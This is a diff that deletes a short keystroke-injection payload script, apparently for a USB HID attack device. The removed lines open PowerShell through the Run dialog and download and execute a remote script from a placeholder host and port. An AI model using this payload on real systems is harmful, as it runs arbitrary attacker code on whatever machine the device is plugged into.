@@ -1,8 +1,0 @@
-ATTACKMODE HID
-
-LED R
-DELAY 200
-RUN WIN powershell "irm http://<ip>:<port>/e.ps1 | iex"
-DELAY 200
-
-LED G
